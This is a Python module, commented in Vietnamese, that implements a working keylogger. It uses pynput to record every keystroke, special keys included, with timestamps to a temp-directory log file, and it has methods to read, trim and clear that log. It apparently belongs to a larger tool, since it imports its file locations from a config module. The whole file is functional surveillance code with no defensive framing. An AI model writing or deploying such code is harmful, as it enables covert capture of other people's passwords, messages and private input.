"""
Module ghi lại thao tác bấm phím
"""
import os
from datetime import datetime
from pynput import keyboard
from config import KEYLOG_FILE, TEMP_DIR


class KeyLogger:
    def __init__(self, log_file=None):
        self.log_file = log_file or os.path.join(TEMP_DIR, KEYLOG_FILE)
        self.keys_pressed = []
        self.listener = None
        
        # Tạo thư mục temp nếu chưa có
        if not os.path.exists(TEMP_DIR):
            os.makedirs(TEMP_DIR)
    
    def on_press(self, key):
        """Xử lý khi phím được nhấn"""
        try:
            # Ghi phím thường
            key_char = key.char
            self.keys_pressed.append(key_char)
        except AttributeError:
            # Ghi phím đặc biệt
            special_keys = {
                keyboard.Key.space: ' ',
                keyboard.Key.enter: '\n',
                keyboard.Key.tab: '\t',
                keyboard.Key.backspace: '[BACKSPACE]',
                keyboard.Key.delete: '[DELETE]',
                keyboard.Key.shift: '[SHIFT]',
                keyboard.Key.ctrl: '[CTRL]',
                keyboard.Key.alt: '[ALT]',
            }
            key_char = special_keys.get(key, f'[{str(key)}]')
            self.keys_pressed.append(key_char)
        
        # Ghi vào file
        self.save_to_file(key_char)
    
    def save_to_file(self, key_char):
        """Lưu phím vào file"""
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"[{timestamp}] {key_char}\n")
        except Exception as e:
            print(f"Lỗi khi ghi file: {e}")
    
    def start(self):
        """Bắt đầu ghi phím"""
        print("Bắt đầu ghi lại thao tác bấm phím...")
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
    
    def stop(self):
        """Dừng ghi phím"""
        if self.listener:
            self.listener.stop()
            print("Đã dừng ghi lại thao tác bấm phím")
    
    def get_log_content(self):
        """Đọc nội dung file log"""
        try:
            if os.path.exists(self.log_file):
                with open(self.log_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                    # Giới hạn kích thước log để tránh quá lớn
                    if len(content) > 50000:  # 50KB
                        # Chỉ lấy phần cuối
                        lines = content.split('\n')
                        content = '\n'.join(lines[-1000:])
                    return content
        except Exception as e:
            pass
        return ""
    
    def clear_old_logs(self, max_size=10000):
        """Xóa log cũ để tránh file quá lớn"""
        try:
            if os.path.exists(self.log_file):
                with open(self.log_file, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                
                # Chỉ giữ lại 1000 dòng cuối
                if len(lines) > 1000:
                    with open(self.log_file, 'w', encoding='utf-8') as f:
                        f.writelines(lines[-1000:])
        except:
            pass
    
    def clear_log(self):
        """Xóa nội dung log"""
        try:
            if os.path.exists(self.log_file):
                os.remove(self.log_file)
                print("Đã xóa file log")
        except Exception as e:
            print(f"Lỗi khi xóa file log: {e}")


if __name__ == "__main__":
    # Test keylogger
    import time
    
    keylogger = KeyLogger()
    keylogger.start()
    
    print("Đang ghi phím... (Nhấn Ctrl+C để dừng)")
    try:
        time.sleep(10)  # Ghi trong 10 giây
    except KeyboardInterrupt:
        pass
    
    keylogger.stop()
    print("\nNội dung log:")
    print(keylogger.get_log_content())

